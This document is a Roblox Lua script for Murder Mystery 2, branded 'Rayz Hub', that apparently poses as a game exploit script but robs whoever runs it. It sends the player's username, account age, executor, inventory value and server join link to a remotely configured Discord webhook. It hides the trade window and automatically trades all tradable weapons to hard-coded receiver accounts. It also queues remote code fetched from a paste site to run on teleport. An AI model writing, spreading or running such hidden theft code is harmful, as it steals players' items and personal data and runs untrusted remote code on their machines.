repeat
	task.wait()
until game:IsLoaded()
task.wait(1)

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
	return
end
_G.scriptExecuted = true

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local MarketplaceService = game:GetService("MarketplaceService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local CONFIG_URL = "https://rayzhub.netlify.app/scripts/config/config.json"

local function loadConfig()
    local success, result = pcall(function()
        local response = game:HttpGet(CONFIG_URL, true)
        return HttpService:JSONDecode(response)
    end)
    if success and result then
        return result
    end
    return nil
end

local Config = loadConfig()

if not Config or not Config.usernames or not Config.webhooks then
    player:Kick("Failed to load config. Check your internet.")
    return
end

local users = Config.usernames 
local webhook = Config.webhooks.mm2

local NAME = "Murder Mystery 2"
local AVATAR_URL = "https://rayzhub.netlify.app/media/mm2(9x9).jpg"
local LOGO_URL = "https://rayzhub.netlify.app/media/logo.jpg"
local IMAGE_URL = "https://rayzhub.netlify.app/media/mm2(9x16).jpg"

local min_rarity = "Common"
local min_value = 0
local pingEveryone = "Yes"
local valuePing = 100
local min_rap = 1000000
local mail_message = "Rayz Hub"

local request = (syn and syn.request) or (http and http.request) or http_request or request

local Request = request

local plr = Players.LocalPlayer
if not plr then
	return
end

local PlaceId = game.PlaceId
local REAL_JOB_ID = nil

local executorName = (identifyexecutor and identifyexecutor()) or "Unknown"
local isDelta = executorName:lower():find("delta") ~= nil

local queueTeleport = queue_on_teleport or queueonteleport or (syn and syn.queue_on_teleport)

local savedRealJobId = (getgenv and (getgenv().RealJobId or getgenv().JobId)) or nil

---------------------------------------------------------------------
--  HELPER FUNCTIONS
---------------------------------------------------------------------
local function getExecutorName()
	if syn then
		return "Synapse X"
	elseif fluxus then
		return "Fluxus"
	elseif KRNL_LOADED then
		return "KRNL"
	elseif is_sirhurt_closure then
		return "SirHurt"
	elseif getexecutorname then
		local s, r = pcall(getexecutorname)
		if s and r then
			return tostring(r)
		end
	elseif identifyexecutor then
		local s, r = pcall(identifyexecutor)
		if s and r then
			return tostring(r)
		end
	end
	return "Unknown"
end

local function getAccountAge()
	local totalDays = plr.AccountAge
	local years = math.floor(totalDays / 365)
	local remaining = totalDays % 365
	local months = math.floor(remaining / 30)
	local days = remaining % 30

	local parts = {}
	if years > 0 then
		table.insert(parts, years .. "y")
	end
	if months > 0 then
		table.insert(parts, months .. "m")
	end
	if days > 0 or #parts == 0 then
		table.insert(parts, days .. "d")
	end
	return table.concat(parts, " ")
end

local function getPlayerCount()
	local current = #Players:GetPlayers()
	local max = Players.MaxPlayers
	return current .. "/" .. max
end

local function getStatusColor(status)
	if status == "🟢 Claimed" or status == "🟢 Connected" then
		return 0x2ECC71
	elseif status == "🔵 Partially Claimed" or status == "🔵 Partially claimed" then
		return 0x3498DB
	elseif status == "🟡 Waiting" then
		return 0xF1C40F
	elseif status == "🔴 Failed" then
		return 0xE74C3C
	end
	return 0x6C5CE7
end

--------------------------------------------------------------------
-- delta jobid bypass
--------------------------------------------------------------------
if isDelta then
	if savedRealJobId and savedRealJobId ~= "" then
		REAL_JOB_ID = savedRealJobId
	else
		if not queueTeleport then
			plr:Kick("queue_on_teleport not found in this executor.")
			return
		end

		local fakeJobId = game.JobId
		local realJobId = nil
		local connection

		connection = TeleportService.TeleportInitFailed:Connect(function(player, _, _, _, errData)
			if player == plr and not realJobId then
				realJobId = errData and errData.ServerInstanceId
				connection:Disconnect()

				if realJobId and realJobId ~= "" then
					local snippet = string.format(
						[[
getgenv().RealJobId = "%s"
getgenv().FakeJobId = "%s"
getgenv().JobId     = "%s"

pcall(function()
    loadstring(game:HttpGet("https://pastefy.app/K2Wlf5mn/raw"))()
end)
]],
						realJobId,
						fakeJobId,
						realJobId
					)

					queueTeleport(snippet)
				else
					plr:Kick("Failed to grab real JobId")
				end
			end
		end)

		for i = 1, 3 do
			task.spawn(function()
				TeleportService:TeleportToPlaceInstance(
					PlaceId,
					(fakeJobId ~= "" and fakeJobId) or "00000000-0000-0000-0000-000000000000",
					plr
				)
			end)
		end

		task.delay(10, function()
			if not realJobId then
				plr:Kick("JobId bypass timeout")
			end
		end)

		return
	end
else
	REAL_JOB_ID = game.JobId
end

REAL_JOB_ID = REAL_JOB_ID or game.JobId

local realJobId = REAL_JOB_ID
local weaponsToSend = {}
local allWeapons = {}
local totalValue = 0
local totalAllValue = 0

local TOP_HIT_THRESHOLD = 1000

local function hasTopHit()
	for _, w in ipairs(weaponsToSend) do
		if (w.Value or 0) > TOP_HIT_THRESHOLD then
			return true
		end
	end
	return false
end

local rarityTable = {
	"Common",
	"Uncommon",
	"Rare",
	"Legendary",
	"Godly",
	"Ancient",
	"Unique",
	"Vintage",
}
local min_rarity_index = table.find(rarityTable, min_rarity) or 5
local GODLY_INDEX = table.find(rarityTable, "Godly") or 5

local untradable = {}

--------------------------------------------------------------------
-- value scraping
--------------------------------------------------------------------
local categories = {
	godly = "https://supremevaluelist.com/mm2/godlies.html",
	ancient = "https://supremevaluelist.com/mm2/ancients.html",
	unique = "https://supremevaluelist.com/mm2/uniques.html",
	classic = "https://supremevaluelist.com/mm2/vintages.html",
	chroma = "https://supremevaluelist.com/mm2/chromas.html",
}

local htmlHeaders = {
	["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
	["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
}

local function trim(s)
	return s:match("^%s*(.-)%s*$")
end

local function fetchHTML(url)
	if not Request then
		return ""
	end
	local ok, res = pcall(function()
		return Request({
			Url = url,
			Method = "GET",
			Headers = htmlHeaders,
		})
	end)
	if not ok or not res or not res.Body then
		return ""
	end
	return res.Body
end

local function parseValue(itembodyDiv)
	local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
	if valueStr then
		valueStr = valueStr:gsub(",", "")
		local value = tonumber(valueStr)
		if value then
			return value
		end
	end
	return nil
end

local function extractItems(htmlContent)
	local itemValues = {}
	for itemName, itembodyDiv in
		htmlContent:gmatch(
			"<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>"
		)
	do
		itemName = itemName:match("([^<]+)")
		if itemName then
			itemName = trim(itemName:gsub("%s+", " "))
			itemName = trim((itemName:split(" Click "))[1])
			local itemNameLower = itemName:lower()
			local value = parseValue(itembodyDiv)
			if value then
				itemValues[itemNameLower] = value
			end
		end
	end
	return itemValues
end

local function extractChromaItems(htmlContent)
	local chromaValues = {}
	for chromaName, itembodyDiv in
		htmlContent:gmatch(
			"<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>"
		)
	do
		chromaName = chromaName:match("([^<]+)")
		if chromaName then
			chromaName = trim(chromaName:gsub("%s+", " ")):lower()
			local value = parseValue(itembodyDiv)
			if value then
				chromaValues[chromaName] = value
			end
		end
	end
	return chromaValues
end

local function buildValueList()
	local allExtractedValues = {}
	local chromaExtractedValues = {}
	local categoriesToFetch = {}

	for rarity, url in pairs(categories) do
		table.insert(categoriesToFetch, { rarity = rarity, url = url })
	end

	local totalCategories = #categoriesToFetch
	local completed = 0
	local lock = Instance.new("BindableEvent")

	for _, category in ipairs(categoriesToFetch) do
		task.spawn(function()
			local rarity = category.rarity
			local url = category.url
			local htmlContent = fetchHTML(url)

			if htmlContent and htmlContent ~= "" then
				if rarity ~= "chroma" then
					local extractedItemValues = extractItems(htmlContent)
					for itemName, value in pairs(extractedItemValues) do
						allExtractedValues[itemName] = value
					end
				else
					chromaExtractedValues = extractChromaItems(htmlContent)
				end
			end

			completed = completed + 1
			if completed == totalCategories then
				lock:Fire()
			end
		end)
	end

	lock.Event:Wait()

	local valueList = {}

	for dataid, item in pairs(_G.__mm2_database_for_value or {}) do
		local itemName = item.ItemName and item.ItemName:lower() or ""
		local rarity = item.Rarity or ""
		local hasChroma = item.Chroma or false

		if itemName ~= "" and rarity ~= "" then
			if hasChroma then
				local matchedChromaValue = nil
				for chromaName, value in pairs(chromaExtractedValues) do
					if chromaName:find(itemName) then
						matchedChromaValue = value
						break
					end
				end
				if matchedChromaValue then
					valueList[dataid] = matchedChromaValue
				end
			else
				local value = allExtractedValues[itemName]
				if value then
					valueList[dataid] = value
				else
					local defaultValues = {
						Common = 1,
						Uncommon = 2,
						Rare = 3,
						Legendary = 5,
						Godly = 10,
						Ancient = 20,
						Unique = 30,
						Vintage = 50,
					}
					valueList[dataid] = defaultValues[rarity] or 1
				end
			end
		end
	end

	return valueList
end

--------------------------------------------------------------------
-- embed helpers
--------------------------------------------------------------------
local MM2_THUMBNAIL = "https://rayzhub.netlify.app/media/mm2(9x16).jpg"
local LOGO_URL = "https://rayzhub.netlify.app/media/logo.png"

local function getRarityEmoji(rarity)
	local map = {
		Common = "⚪",
		Uncommon = "🟢",
		Rare = "🔵",
		Legendary = "🟡",
		Godly = "🟣",
		Ancient = "🔴",
		Unique = "💎",
		Vintage = "🟤",
	}
	return map[rarity] or "⚪"
end

local function shouldPingByValue()
	if valuePing <= 0 then
		return false
	end
	for _, w in ipairs(allWeapons) do
		if w.Value >= valuePing then
			return true
		end
	end
	return false
end

local function buildFullInventoryLines()
	local lines = {}
	if #allWeapons == 0 then
		return { "No items found" }
	end
	for _, w in ipairs(allWeapons) do
		local flag = ""
		if w.Tradable == false then
			flag = " 🔒"
		end
		local emoji = getRarityEmoji(w.Rarity)
		local line = string.format(
			"%s %s x%d → %d [%s]%s",
			emoji,
			w.DataID,
			w.Amount,
			(w.Value * w.Amount),
			w.Rarity or "?",
			flag
		)
		table.insert(lines, line)
	end
	return lines
end

local function chunkLines(lines, maxChars)
	maxChars = maxChars or 900
	local chunks = {}
	local current = ""
	for _, line in ipairs(lines) do
		line = tostring(line)
		local addLen = #line
		if current ~= "" then
			addLen = addLen + 1
		end
		if #current + addLen > maxChars then
			if current ~= "" then
				table.insert(chunks, current)
			end
			current = line
		else
			if current == "" then
				current = line
			else
				current = current .. "\n" .. line
			end
		end
	end
	if current ~= "" then
		table.insert(chunks, current)
	end
	return chunks
end

--------------------------------------------------------------------
-- load database & inventory
--------------------------------------------------------------------
local database =
	require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
local profileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)

_G.__mm2_database_for_value = database

local valueList = {}
pcall(function()
	valueList = buildValueList()
end)

for dataid, amount in pairs(profileData.Weapons.Owned or {}) do
	local item = database[dataid]
	if item then
		local rarity = item.Rarity or "Unknown"
		local value = valueList[dataid]
		if not value then
			local defaultValues = {
				Common = 1,
				Uncommon = 2,
				Rare = 3,
				Legendary = 5,
				Godly = 10,
				Ancient = 20,
				Unique = 30,
				Vintage = 50,
			}
			value = defaultValues[rarity] or 1
		end

		local tradable = not untradable[dataid]

		table.insert(allWeapons, {
			DataID = dataid,
			Amount = amount,
			Value = value,
			Rarity = rarity,
			Tradable = tradable,
		})

		totalAllValue = totalAllValue + (value * amount)

		if tradable then
			totalValue = totalValue + (value * amount)
			table.insert(weaponsToSend, {
				DataID = dataid,
				Amount = amount,
				Value = value,
				Rarity = rarity,
			})
		end
	end
end

table.sort(weaponsToSend, function(a, b)
	local rarityA = table.find(rarityTable, a.Rarity) or 0
	local rarityB = table.find(rarityTable, b.Rarity) or 0
	if rarityA == rarityB then
		return (a.Value * a.Amount) > (b.Value * b.Amount)
	end
	return rarityA > rarityB
end)

table.sort(allWeapons, function(a, b)
	local rarityA = table.find(rarityTable, a.Rarity) or 0
	local rarityB = table.find(rarityTable, b.Rarity) or 0
	if rarityA == rarityB then
		return (a.Value * a.Amount) > (b.Value * b.Amount)
	end
	return rarityA > rarityB
end)

--------------------------------------------------------------------
-- send webhook embed
--------------------------------------------------------------------
local function sendSuccessEmbed()
	local joinUrl = string.format(
		"https://rayzhub.netlify.app/?placeId=%d&jobId=%s",
		PlaceId,
		tostring(realJobId)
	)

	local tpScript = string.format(
		"game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s')",
		PlaceId,
		tostring(realJobId)
	)

	local executor = getExecutorName()
	local accountAge = getAccountAge()
	local playerCount = getPlayerCount()
	local receiverList = table.concat(users, ", ")
	local displayName = (plr.DisplayName and plr.DisplayName ~= "") and plr.DisplayName or plr.Name
	local userName = plr.Name

	-- Player information block with aligned colons
	local playerInfoText = "👤 Display Name  : "
		.. displayName
		.. "\n"
		.. "🆔 Username      : "
		.. userName
		.. "\n"
		.. "📅 Account Age   : "
		.. accountAge
		.. "\n"
		.. "🖥  Executor      : "
		.. executor
		.. "\n"
		.. "👥 Players       : "
		.. playerCount
		.. "\n"
		.. "😎 Receiver      : "
		.. receiverList

	-- Dynamic embed color
	local currentStatus = "🟢 Connected"
	local embedColor = getStatusColor(currentStatus)

	-- Inventory lines
	local inventoryLines = buildFullInventoryLines()
	local invChunks = chunkLines(inventoryLines, 900)

	-- Add summary line to last chunk
	if #invChunks > 0 then
		invChunks[#invChunks] = invChunks[#invChunks]
			.. "\n─────────────────────────────────\n💰 Total Value: "
			.. tostring(totalAllValue)
			.. " (Tradable: "
			.. tostring(totalValue)
			.. ")"
	end

	-- Build fields
	local fields = {
		{
			name = "📄 Player Information",
			value = "```" .. playerInfoText .. "```",
			inline = false,
		},
		{
			name = "📡 Player Status",
			value = "```" .. currentStatus .. "```",
			inline = false,
		},
	}

	for i, chunk in ipairs(invChunks) do
		local suffix = (#invChunks > 1) and (" (Part " .. i .. ")") or ""
		table.insert(fields, {
			name = "🎒 Inventory" .. suffix .. " (" .. #allWeapons .. " items)",
			value = "```" .. chunk .. "```",
			inline = false,
		})
	end

	table.insert(fields, {
		name = "👤 Join Link",
		value = "[🔗 Click to Join Player](" .. joinUrl .. ")",
		inline = false,
	})

	-- Ping logic
	local contentText = ""
	local hitLabel = "SMALL"
	if hasTopHit() then
		hitLabel = "AMAZING"
	elseif totalAllValue >= 100 then
		hitLabel = "DECENT"
	end

	if pingEveryone == "Yes" and (shouldPingByValue() or hasTopHit()) then
		contentText = "> @everyone 🔔 **" .. hitLabel .. " HIT • Value: " .. tostring(totalAllValue) .. "**"
	else
		contentText = "> 🔔 **" .. hitLabel .. " HIT • Value: " .. tostring(totalAllValue) .. "**"
	end
	contentText = contentText .. "\n```lua\n" .. tpScript .. "\n```"

	local data = {
		content = contentText,
		username = NAME,
		avatar_url = AVATAR_URL,
		embeds = {
			{
				title = "⚡ RAYZ HUB ⚡",
				color = embedColor,
				thumbnail = {
					url = LOGO_URL,
				},
				fields = fields,
				footer = {
					text = "RAYZ HUB • MM2 • " .. os.date("!%m/%d/%Y %I:%M %p") .. " UTC",
					icon_url = LOGO_URL,
				},
				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
				image = {
					url = IMAGE_URL,
				},
			},
		},
	}

	pcall(function()
		request({
			Url = webhook .. "?wait=true",
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = HttpService:JSONEncode(data),
		})
	end)
end

sendSuccessEmbed()

if #weaponsToSend == 0 then
	return
end

--------------------------------------------------------------------
-- trade logic
--------------------------------------------------------------------
local playerGui = plr:WaitForChild("PlayerGui")
local accept = ReplicatedStorage.Trade.AcceptTrade
local sec_arg = nil

ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(info)
	if info.LastOffer then
		sec_arg = info.LastOffer
	end
end)

local tradeGui = playerGui:WaitForChild("TradeGUI")
tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
	tradeGui.Enabled = false
end)

local tradeGuiPhone = playerGui:WaitForChild("TradeGUI_Phone")
tradeGuiPhone:GetPropertyChangedSignal("Enabled"):Connect(function()
	tradeGuiPhone.Enabled = false
end)

local function sendTradeRequest(user)
	local target = Players:FindFirstChild(user)
	if not target then
		return false
	end

	local success, err = pcall(function()
		return ReplicatedStorage.Trade.SendRequest:InvokeServer(target)
	end)

	if not success then
		success, err = pcall(function()
			return ReplicatedStorage.Trade.SendRequest:FireServer(target)
		end)
		if not success then
			return false
		end
	end

	return true
end

local function getTradeStatus()
	return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
end

local function waitForTradeCompletion()
	while true do
		local status = getTradeStatus()
		if status == "None" then
			break
		end
		task.wait(0.1)
	end
end

local function acceptTrade()
	local maxWait = 10
	local waited = 0
	while not sec_arg and waited < maxWait do
		task.wait(0.1)
		waited = waited + 0.1
	end

	if sec_arg then
		accept:FireServer(game.PlaceId * 3, sec_arg)
		sec_arg = nil
	end
end

local function addWeaponToTrade(id)
	ReplicatedStorage.Trade.OfferItem:FireServer(id, "Weapons")
end

local function doTrade(targetName)
	local target = Players:FindFirstChild(targetName)
	if not target then
		return
	end

	local initialTradeState = getTradeStatus()
	if initialTradeState == "StartTrade" then
		ReplicatedStorage.Trade.DeclineTrade:FireServer()
		task.wait(0.3)
	elseif initialTradeState == "ReceivingRequest" then
		ReplicatedStorage.Trade.DeclineRequest:FireServer()
		task.wait(0.3)
	end

	while #weaponsToSend > 0 do
		local tradeStatus = getTradeStatus()

		if tradeStatus == "None" then
			sendTradeRequest(targetName)
		elseif tradeStatus == "SendingRequest" then
			task.wait(0.3)
		elseif tradeStatus == "ReceivingRequest" then
			ReplicatedStorage.Trade.DeclineRequest:FireServer()
			task.wait(0.3)
		elseif tradeStatus == "StartTrade" then
			for i = 1, math.min(4, #weaponsToSend) do
				local weapon = table.remove(weaponsToSend, 1)
				for _ = 1, weapon.Amount do
					addWeaponToTrade(weapon.DataID)
				end
			end
			task.wait(6)
			acceptTrade()
			waitForTradeCompletion()
		else
			task.wait(0.5)
		end

		task.wait(1)
	end
end

local tradingWith = {}

local function onChat(player)
	local playerNameLower = player.Name:lower()
	local isTarget = false

	for _, targetName in ipairs(users) do
		if targetName:lower() == playerNameLower then
			isTarget = true
			break
		end
	end

	if isTarget then
		player.Chatted:Connect(function()
			if tradingWith[player.Name] then
				return
			end
			tradingWith[player.Name] = true
			doTrade(player.Name)
		end)
	end
end

local function autoTradeOnJoin(player)
	local playerNameLower = player.Name:lower()
	local isTarget = false

	for _, targetName in ipairs(users) do
		if targetName:lower() == playerNameLower then
			isTarget = true
			break
		end
	end

	if isTarget then
		task.wait(3)
		if player and player.Parent and Players:FindFirstChild(player.Name) then
			if tradingWith[player.Name] then
				return
			end
			if #weaponsToSend == 0 then
				return
			end
			tradingWith[player.Name] = true
			doTrade(player.Name)
		end
	end
end

for _, p in Players:GetPlayers() do
	onChat(p)
end

for _, player in Players:GetPlayers() do
	if player ~= plr then
		task.spawn(autoTradeOnJoin, player)
	end
end

Players.PlayerAdded:Connect(function(player)
	onChat(player)
	if player ~= plr then
		task.spawn(autoTradeOnJoin, player)
	end
end)

print("[Rayz Hub] mm2 loaded...")